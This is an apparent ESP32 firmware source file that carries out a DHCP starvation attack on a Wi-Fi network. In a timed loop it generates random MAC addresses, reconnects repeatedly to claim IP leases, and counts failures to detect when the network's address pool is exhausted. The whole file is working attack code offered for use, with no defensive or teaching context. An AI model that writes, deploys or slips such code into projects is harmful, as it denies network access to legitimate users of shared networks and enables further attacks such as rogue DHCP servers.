#include "dhcp_starvation.h"
#include "config.h"
#include <WiFi.h>
#include <esp_wifi.h>

static uint8_t s_original_mac[6];
static uint8_t s_random_mac[6];
static bool s_running = false;
static unsigned long s_last_reconnect = 0;
static int s_reconnect_count = 0;
static int s_consecutive_failures = 0;
static String s_current_ip = "";

static void mac_to_str(const uint8_t* mac, char* buf) {
    snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void generate_random_mac() {
    randomSeed(millis());
    for (int i = 0; i < 6; i++) {
        s_random_mac[i] = random(0, 256);
    }
    s_random_mac[0] |= 0x02;
    s_random_mac[0] &= 0xFE;
}

void dhcp_init() {
    s_running = false;
    s_reconnect_count = 0;
    s_consecutive_failures = 0;
    s_last_reconnect = 0;
    s_current_ip = "";
    WiFi.macAddress(s_original_mac);
}

void dhcp_start() {
    if (s_running) return;
    if (strlen(g_config.ssid) == 0) {
        Serial.println("[DHCP] SSID not set");
        return;
    }
    s_running = true;
    s_reconnect_count = 0;
    s_consecutive_failures = 0;
    s_last_reconnect = millis() - (unsigned long)g_config.cooldown_ms;
    Serial.println("[DHCP] Starvation started");
}

void dhcp_stop() {
    if (!s_running) return;
    s_running = false;
    esp_wifi_set_mac(WIFI_IF_STA, s_original_mac);
    Serial.printf("[DHCP] Stopped. Reconnects: %d\n", s_reconnect_count);
}

bool dhcp_is_running() {
    return s_running;
}

void dhcp_step() {
    if (!s_running) return;

    unsigned long now = millis();
    if (now - s_last_reconnect < (unsigned long)g_config.cooldown_ms) return;
    s_last_reconnect = now;

    generate_random_mac();
    if (esp_wifi_set_mac(WIFI_IF_STA, s_random_mac) != ESP_OK) {
        Serial.println("[DHCP] MAC set failed");
        return;
    }

    WiFi.disconnect(false);
    delay(100);
    WiFi.begin(g_config.ssid, g_config.password);

    int retries = 50;
    while (WiFi.status() != WL_CONNECTED && retries-- > 0) {
        delay(100);
    }

    if (WiFi.status() == WL_CONNECTED) {
        s_reconnect_count++;
        s_consecutive_failures = 0;
        s_current_ip = WiFi.localIP().toString();
        char mac_str[18];
        mac_to_str(s_random_mac, mac_str);
        Serial.printf("[DHCP] #%d IP: %s MAC: %s\n", s_reconnect_count, s_current_ip.c_str(), mac_str);
    } else {
        s_consecutive_failures++;
        Serial.printf("[DHCP] #%d FAIL (consecutive: %d)\n", s_reconnect_count + 1, s_consecutive_failures);
    }
}

int dhcp_get_reconnect_count() {
    return s_reconnect_count;
}

int dhcp_get_consecutive_failures() {
    return s_consecutive_failures;
}

bool dhcp_is_pool_full() {
    return s_consecutive_failures >= 10;
}

String dhcp_get_current_ip() {
    return s_current_ip;
}

String dhcp_get_current_mac() {
    char buf[18];
    mac_to_str(s_random_mac, buf);
    return String(buf);
}

String dhcp_get_original_mac() {
    char buf[18];
    mac_to_str(s_original_mac, buf);
    return String(buf);
}

int dhcp_get_cooldown() {
    return g_config.cooldown_ms;
}
